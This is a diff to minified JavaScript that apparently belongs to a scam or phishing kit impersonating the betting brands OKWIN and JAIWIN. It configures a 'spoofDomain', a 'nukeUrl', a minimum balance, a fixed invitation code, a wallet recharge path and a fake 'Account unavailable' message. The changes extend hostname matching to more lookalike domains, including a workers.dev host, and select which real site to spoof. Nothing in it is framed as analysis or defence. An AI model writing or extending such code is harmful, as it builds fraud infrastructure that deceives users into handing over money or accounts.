@@ -2651,7 +2651,7 @@ function me() {
 }
 function Po() {
     if (k) return;
-    let n = "www.8okwin4.com".includes("okwin"),
+    let n = /okwin|ok888|cqz6091|wakeuptorealityok/.test(location.hostname),
         t = document.createElement("style");
     ((t.textContent = `
     .wgp-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.75);z-index:99998;display:none}
@@ -3362,12 +3362,6 @@ function Qo(n) {
     } catch (t) { }
 }
 function rt(n, t, e, o) {
-    if (t && t.startsWith("/")) {
-        var domain = "https://www.8okwin4.com";
-        if (location.hostname.includes("workers.dev")) {
-            t = domain + t;
-        }
-    }
     return new Promise(function (i, l) {
         var f = new XMLHttpRequest();
         if ((f.open(n, t, !0), o)) for (var c in o) f.setRequestHeader(c, o[c]);
@@ -4121,11 +4115,12 @@ sessionStorage.setItem("invitecode", "116261778244");
 var Yo = "https://imgametransit.com",
     Vo = "Account unavailable. Please create a new account.",
     Ko = "/#/register?invitationCode=116261778244",
-    Do = "/#/wallet/Recharge",
-    Bo = "www.8okwin4.com".includes("okwin") ? "light" : "dark",
-    Ao = "www.8okwin4.com".includes("okwin") ? "OKWIN" : "JAIWIN",
-    so = "www.8okwin4.com".includes("okwin") ? "test.wakeuptorealityok.workers.dev" : "jaiclub.win",
-    De = "";
+    Do = "/#/wallet/Recharge";
+    var isOkwin = /okwin|ok888|cqz6091|wakeuptorealityok/.test(location.hostname),
+        Bo = isOkwin ? "light" : "dark",
+        Ao = isOkwin ? "OKWIN" : "JAIWIN",
+        so = isOkwin ? "test.wakeuptorealityok.workers.dev" : "jaiclub.win",
+        De = "";
 function _(n) {
     let t = String(n == null ? "" : n).trim();
     return /^\d{8,22}$/.test(t) ? t : "";
@@ -4266,7 +4261,7 @@ function se() {
 }
 Wt({
     apiBase: Yo,
-    spoofDomain: "www.8okwin4.com",
+    spoofDomain: /cqz6091|wakeuptorealityok/.test(location.hostname) ? "www.cqz6091.com" : "www.8okwin4.com",
     minBalance: 500,
     nukeUrl: Ko,
     authErrMsg: Vo,
